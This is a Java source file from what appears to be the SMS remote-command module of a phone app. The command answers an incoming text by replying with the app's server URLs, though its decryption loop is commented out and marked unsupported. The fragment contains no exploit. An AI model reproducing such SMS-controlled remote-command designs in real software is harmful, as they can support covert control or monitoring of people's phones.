package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.info.ServerUrl;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class SMSQueryURL extends RmtCmdSync {
	
	public SMSQueryURL(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getQueryUrlCmd());
		try {
			// TODO: Not supported
			ServerUrl serverUrl = Global.getServerUrl();
			/* Hashtable listServerUrl = serverUrl.getListServerUrl();
			Enumeration e = listServerUrl.keys();
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.SERVER_URL);
			while (e.hasMoreElements()) {
				byte[] key = (byte[]) e.nextElement();
				byte[] encryptedUrl =  (byte[]) listServerUrl.get(key);
				String servUrl = new String(AESDecryptor.decrypt(key, encryptedUrl));	
				responseMessage.append(servUrl);
				responseMessage.append(Constant.CRLF);
			}	*/		
		} catch(Exception e) {
			Log.error("CmdQueryUrl.execute()", e.getMessage(), e);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdQueryUrl.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
